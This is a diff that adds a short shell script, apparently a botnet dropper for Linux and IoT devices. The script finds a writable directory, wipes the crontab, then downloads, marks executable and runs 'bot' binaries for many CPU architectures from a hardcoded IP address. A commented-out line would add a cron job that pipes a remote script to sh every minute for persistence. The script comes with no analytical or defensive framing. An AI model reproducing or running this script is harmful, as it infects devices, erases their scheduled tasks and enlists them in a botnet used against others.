@@ -1,0 +1,23 @@
+>/tmp/.f && cd /tmp
+>/var/tmp/.f && cd /var/tmp
+>/dev/shm/.f && cd /dev/shm
+>/dev/.f && cd /dev
+
+rm .f
+
+crontab -r
+
+
+curl http://104.244.77.74/bot.arm4 > .f; chmod 777 .f || chmod +x .f; ./.f ssh.arm4; rm .f
+curl http://104.244.77.74/bot.arm5 > .f; chmod 777 .f || chmod +x .f; ./.f ssh.arm5; rm .f
+curl http://104.244.77.74/bot.arm6 > .f; chmod 777 .f || chmod +x .f; ./.f ssh.arm6; rm .f
+curl http://104.244.77.74/bot.arm7 > .f; chmod 777 .f || chmod +x .f; ./.f ssh.arm7; rm .f
+curl http://104.244.77.74/bot.mips > .f; chmod 777 .f || chmod +x .f; ./.f ssh.mips; rm .f
+curl http://104.244.77.74/bot.mipsel > .f; chmod 777 .f || chmod +x .f; ./.f ssh.mipsel; rm .f
+curl http://104.244.77.74/bot.superh > .f; chmod 777 .f || chmod +x .f; ./.f ssh.superh; rm .f
+curl http://104.244.77.74/bot.powerpc > .f; chmod 777 .f || chmod +x .f; ./.f ssh.powerpc; rm .f
+curl http://104.244.77.74/bot.x86 > .f; chmod 777 .f || chmod +x .f; ./.f ssh.x86; rm .f
+curl http://104.244.77.74/bot.x86_64 > .f; chmod 777 .f || chmod +x .f; ./.f ssh.x86_64; rm .f
+
+echo done
+#echo "* * * * * wget http://104.244.77.74/ssh -O- | sh; curl http://104.244.77.74/ssh | sh" | crontab -
